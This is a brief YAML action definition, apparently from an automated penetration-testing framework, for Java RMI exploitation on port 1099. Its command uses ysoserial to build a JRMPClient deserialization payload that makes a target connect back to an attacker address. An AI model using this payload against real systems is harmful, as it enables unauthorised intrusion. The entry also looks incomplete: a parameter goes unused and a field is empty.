name: java_rmi
category: services
description: Java RMI exploitation
preconditions:
- service.port==1099
parameters:
  target_ip: from_engagement.target_ip
command_template: java -jar ysoserial-all.jar JRMPClient {attacker_ip}:9999 | xxd
parser: null
expected_effects:
- action_completed
falsifier:
